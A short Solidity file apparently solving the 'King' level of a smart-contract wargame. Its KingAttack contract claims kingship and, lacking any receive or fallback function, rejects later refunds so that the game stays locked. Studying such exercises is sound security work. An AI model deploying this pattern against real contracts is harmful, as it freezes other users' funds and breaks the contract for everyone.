// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

contract KingAttack {
    function attack(address payable kingAddress) public payable {
        (bool success, ) = kingAddress.call{value: msg.value}("");
        require(success, "Failed to transfer ETH");
    }
}
